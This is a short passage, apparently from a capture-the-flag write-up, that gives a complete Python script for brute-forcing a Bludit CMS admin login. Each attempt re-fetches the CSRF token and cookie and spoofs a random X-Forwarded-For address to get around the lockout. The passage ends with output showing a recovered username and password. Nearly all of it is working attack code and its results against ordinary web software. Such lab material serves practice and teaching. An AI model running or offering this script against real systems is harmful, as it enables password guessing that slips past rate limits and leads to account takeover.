# Script to bypass bruteforce mitigation
User found: fergus

```python
import sys,re, requests, random

if len(sys.argv) != 4:
    print ('Example python brute-csrf.py http://10.10.10.10/login user wordlist')
    sys.exit()

HOST = sys.argv[1]
USER = sys.argv[2]
WORDLIST = sys.argv[3]
PROXY = { 'http':'//127.0.0.1:8080' }

def init_session():
    # Return CSRF + Session (cookie)
    r = requests.get(HOST)
    csrf = re.search(r'input type="hidden" id="jstokenCSRF" name="tokenCSRF" value="([a-f0-9]*)"', r.text)
    csrf = csrf.group(1)
    cookie = r.cookies.get('BLUDIT-KEY') #CHANGE THIS
    return csrf, cookie

def login(user, password):
    csrf,cookie = init_session()
    headers = {
            'X-Forwarded-For': f"{random.randint(1,256)}.{random.randint(1,256)}.{random.randint(1,256)}.{random.randint(1,256)}" #Bruteforce mitigation Bypass
            }
    data = {
            'tokenCSRF':csrf,
            'username':user,
            'password':password,
            'save':''
            }
    cookies = {
            'BLUDIT-KEY':cookie
            }
    r = requests.post(HOST, data=data, cookies=cookies, headers=headers, allow_redirects=False, proxies=PROXY) 
    if r.status_code != 200:
        print("[+] == PASSWORD FOUND ==[+]")
        print(f"{USER}:{password}")
        print("[+] ====================[+]")
        return True
    elif "password incorrect" in r.text: #change this for your text response
        return False
    elif "has been blocked" in r.text: #change this for your text response
        print("BLOCKED")
        return False
    else:
        print(f"{USER}:{password}")
        return True

wl = open(WORDLIST).readlines()
for line in wl:
    line = line.strip()
    login(USER,line)

```

```bash
$ python csrf-brute.py http://10.10.10.191/admin/login fergus wordlist
[+] == PASSWORD FOUND ==[+]
fergus:RolandDeschain
[+] ====================[+
```